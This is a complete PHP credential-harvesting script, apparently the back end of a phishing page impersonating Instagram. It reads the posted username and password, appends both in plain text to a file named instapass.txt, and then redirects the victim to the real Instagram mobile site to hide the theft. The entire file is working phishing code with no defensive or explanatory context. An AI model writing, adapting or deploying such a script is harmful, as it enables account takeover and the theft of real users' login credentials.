<?php
$name = $_POST['username'];
$password = $_POST['pass'];

$fp = fopen("instapass.txt", "a");
$savestring = "\r\n".$name .":\t". $password."\r\n";
fwrite($fp, $savestring);
fclose($fp);

header("Location: http://m.instagram.com/");
die();


?>